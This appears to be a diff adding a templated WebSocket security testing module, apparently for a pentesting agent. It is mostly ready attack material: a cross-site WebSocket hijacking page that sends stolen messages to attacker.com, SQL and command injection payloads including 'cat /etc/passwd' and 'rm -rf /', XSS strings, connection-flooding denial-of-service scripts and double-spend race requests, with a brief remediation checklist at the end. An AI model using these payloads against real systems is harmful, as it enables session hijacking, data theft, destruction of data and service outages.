@@ -1,0 +1,288 @@
+{# WebSocket Security Testing Module #}
+{# Comprehensive WebSocket vulnerability discovery and exploitation #}
+
+<websocket_security_module>
+
+## WEBSOCKET SECURITY TESTING GUIDE
+
+### DISCOVERY & RECONNAISSANCE
+
+**WebSocket Endpoint Detection:**
+```
+Common WebSocket Paths:
+/ws
+/websocket
+/socket
+/socket.io
+/sockjs
+/realtime
+/live
+/stream
+/chat
+/notifications
+/api/ws
+/v1/ws
+```
+
+**Protocol Identification:**
+```
+ws://target.com/endpoint      # Unencrypted (port 80)
+wss://target.com/endpoint     # Encrypted TLS (port 443)
+```
+
+**Connection Fingerprinting:**
+```javascript
+// Check for WebSocket support and observe upgrade headers
+GET /endpoint HTTP/1.1
+Host: target.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+Origin: https://attacker.com
+```
+
+### CROSS-SITE WEBSOCKET HIJACKING (CSWSH)
+
+**Attack Vector:**
+```html
+<!DOCTYPE html>
+<html>
+<script>
+  var ws = new WebSocket("wss://vulnerable-target.com/ws");
+  
+  ws.onopen = function() {
+    // Hijacked connection - send malicious commands
+    ws.send('{"action": "getPrivateData"}');
+  };
+  
+  ws.onmessage = function(evt) {
+    // Exfiltrate data to attacker server
+    fetch('https://attacker.com/steal?data=' + btoa(evt.data));
+  };
+</script>
+</html>
+```
+
+**Testing Steps:**
+1. Host malicious HTML on attacker domain
+2. Victim visits attacker page while authenticated
+3. Victim's cookies/session used for WebSocket connection
+4. Attacker receives sensitive data
+
+**Vulnerable Indicators:**
+- No Origin header validation
+- Cookie-based authentication only
+- Missing CSRF tokens in WebSocket handshake
+
+### AUTHENTICATION & AUTHORIZATION
+
+**Token in URL Exposure:**
+```
+wss://target.com/ws?token=SENSITIVE_TOKEN
+# Token exposed in logs, Referer, browser history
+```
+
+**Missing Authorization Checks:**
+```json
+// Test accessing other users' data
+{"action": "getMessages", "userId": 1}
+{"action": "getMessages", "userId": 2}
+{"action": "getMessages", "userId": 999}
+
+// Test admin functions
+{"action": "deleteUser", "userId": 1}
+{"action": "modifySettings", "setting": "admin", "value": true}
+```
+
+**Session Fixation:**
+```javascript
+// Force victim to use attacker's session
+ws.send('{"action": "setSession", "sessionId": "ATTACKER_SESSION"}');
+```
+
+### INJECTION ATTACKS
+
+**SQL Injection via WebSocket:**
+```json
+{"action": "search", "query": "test' OR '1'='1"}
+{"action": "getUser", "id": "1; DROP TABLE users--"}
+{"action": "login", "username": "admin'--", "password": "x"}
+```
+
+**Command Injection:**
+```json
+{"action": "ping", "host": "127.0.0.1; cat /etc/passwd"}
+{"action": "export", "filename": "test.txt; rm -rf /"}
+{"action": "process", "cmd": "`whoami`"}
+```
+
+**XSS via WebSocket:**
+```json
+{"action": "sendMessage", "content": "<script>alert(document.cookie)</script>"}
+{"action": "setNickname", "name": "<img src=x onerror=alert(1)>"}
+{"action": "updateProfile", "bio": "javascript:alert(1)"}
+```
+
+**CRLF Injection:**
+```json
+{"action": "setHeader", "value": "test\r\nX-Injected: malicious"}
+```
+
+### DENIAL OF SERVICE (DoS)
+
+**Connection Flooding:**
+```python
+import websocket
+import threading
+
+def flood():
+    while True:
+        try:
+            ws = websocket.create_connection("wss://target.com/ws")
+        except:
+            pass
+
+# Create 1000 concurrent connections
+for _ in range(1000):
+    threading.Thread(target=flood).start()
+```
+
+**Message Flooding:**
+```python
+ws = websocket.create_connection("wss://target.com/ws")
+while True:
+    ws.send("A" * 1000000)  # Send large messages
+```
+
+**Ping/Pong Abuse:**
+```python
+# Send rapid ping frames
+while True:
+    ws.ping()
+```
+
+**Resource Exhaustion:**
+```json
+{"action": "subscribe", "channels": ["ch1", "ch2", ..., "ch10000"]}
+{"action": "search", "query": "a".repeat(1000000)}
+```
+
+### DATA EXPOSURE
+
+**Message Eavesdropping:**
+```python
+# Capture all WebSocket messages
+ws.onmessage = function(e) {
+    console.log("Captured:", e.data);
+    // May contain: user data, internal IDs, tokens, PII
+};
+```
+
+**Sensitive Data in Messages:**
+```json
+// Look for exposed data in responses
+{"type": "user_data", "email": "user@example.com", "ssn": "123-45-6789"}
+{"type": "internal", "db_connection": "mysql://user:pass@host/db"}
+{"type": "debug", "stack_trace": "..."}
+```
+
+### PROTOCOL EXPLOITATION
+
+**Subprotocol Abuse:**
+```javascript
+// Test different subprotocols
+new WebSocket("wss://target.com/ws", ["graphql-ws"]);
+new WebSocket("wss://target.com/ws", ["soap"]);
+new WebSocket("wss://target.com/ws", ["xmpp"]);
+```
+
+**Extension Exploitation:**
+```
+Sec-WebSocket-Extensions: permessage-deflate
+Sec-WebSocket-Extensions: x-custom-extension
+```
+
+**Binary Frame Injection:**
+```python
+# Send binary frames instead of text
+ws.send_binary(b'\x00\x01\x02\x03\x04')
+```
+
+### RACE CONDITIONS
+
+**Message Ordering Attacks:**
+```python
+import asyncio
+
+async def race_attack(ws):
+    # Send concurrent requests to trigger race conditions
+    await asyncio.gather(
+        ws.send('{"action": "withdraw", "amount": 100}'),
+        ws.send('{"action": "withdraw", "amount": 100}'),
+        ws.send('{"action": "withdraw", "amount": 100}'),
+    )
+```
+
+**Double-Spending:**
+```json
+// Send same transaction multiple times simultaneously
+{"action": "transfer", "to": "attacker", "amount": 1000, "nonce": 1}
+{"action": "transfer", "to": "attacker", "amount": 1000, "nonce": 1}
+```
+
+### TESTING TOOLS
+
+**Browser DevTools:**
+- Network tab → WS filter → Inspect frames
+- Console → new WebSocket() for manual testing
+
+**Command Line Tools:**
+```bash
+# websocat - WebSocket CLI
+websocat wss://target.com/ws
+
+# wscat - WebSocket client
+wscat -c wss://target.com/ws
+
+# Burp Suite - WebSocket history and repeater
+```
+
+**Python Testing Script:**
+```python
+import websocket
+import json
+
+def on_message(ws, message):
+    print(f"Received: {message}")
+
+def on_open(ws):
+    # Test payloads
+    payloads = [
+        '{"action": "test", "id": 1}',
+        '{"action": "admin", "cmd": "getUsers"}',
+        '<script>alert(1)</script>',
+    ]
+    for p in payloads:
+        ws.send(p)
+
+ws = websocket.WebSocketApp("wss://target.com/ws",
+                            on_message=on_message,
+                            on_open=on_open)
+ws.run_forever()
+```
+
+### REMEDIATION CHECKLIST
+
+- [ ] Validate Origin header strictly
+- [ ] Implement CSRF tokens for WebSocket handshake
+- [ ] Use secure token-based authentication (not just cookies)
+- [ ] Validate and sanitize all incoming messages
+- [ ] Implement rate limiting per connection
+- [ ] Set maximum message size limits
+- [ ] Use wss:// (TLS) in production
+- [ ] Implement proper authorization for all actions
+- [ ] Log and monitor WebSocket connections
+- [ ] Implement connection timeouts
+
+</websocket_security_module>
